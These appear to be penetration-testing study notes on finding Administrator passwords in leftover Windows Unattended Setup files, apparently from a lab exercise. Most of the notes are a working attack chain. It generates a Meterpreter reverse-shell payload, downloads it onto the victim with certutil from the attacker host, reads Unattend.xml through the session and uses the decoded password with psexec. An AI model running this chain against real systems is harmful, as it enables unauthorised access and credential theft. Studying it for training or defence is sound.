Searching for Password  In windows Configuration Files
#### Windows Configuration Files
- Windows can automate a variety of repetitive tasks,such as the mass rollout or installtion of Windows on Many systems
- This is typically done through the use of the Unattended Windows security setup utility,which is used to automate the mass installation/deployment of Windows on systems.
- This tool utilizes configuration files that contain specific configurations and user account credentials,specifically the Administrator account's password.
- If the Unattended Windows setup configuration files are left on the target system after installtion,they can reveal user account credentials that can be used by attackers to authenticate with windows target legitimately.
#### Unattended Windows Setup
- The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information
+ C:\Windows\Panther\Unattend.xml
+ C:\Windows\Panther\Autounattend.xml
- As a security precaution,the passwords stored in the Unattended Windows Setup configuration file may be encoded in base64.
#### Exploit
- Here we have access to attacker and victim machine too.
- msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.12 LPORT=1234 -f exe > payload.exe [ generate a payload in attacker machine ]
- python -m SimpleHTTPServer 80 [ start a sever in attacker machine ]
- certutil -urlcache -f http://10.10.10.12/payload.exe payload.exe [ run this attacker cmd,it will downlaod payload.exe from attacker machine and save as payload.exe ]
- back to attacker kali machine
- msfconsole
- use multi/handler
- set payload  windows/x64/meterpreter/reverse_tcp
- set LPORT 1234
- set LHOST 10.10.10.12
- run
- Now back to victim machine and execute the payload.exe
- we will get meterpreter session in attacker machine
- search [ this will show how to search in meterpreter ]
- search -f Unattend.xml [ this will take while to find the file ]
- we can manually find the Unattended.xml file in C:\Windows\Panther\Unattend.xml this location
- downlaod unattend.xml
- cat unattend.xml 
- here we will find user and password[ base 64 encoded]
- move to attacker kali machine
- psexec.py Administrator@10.2.27.165 [ use the password to login ]
- this will give us cmd prompt
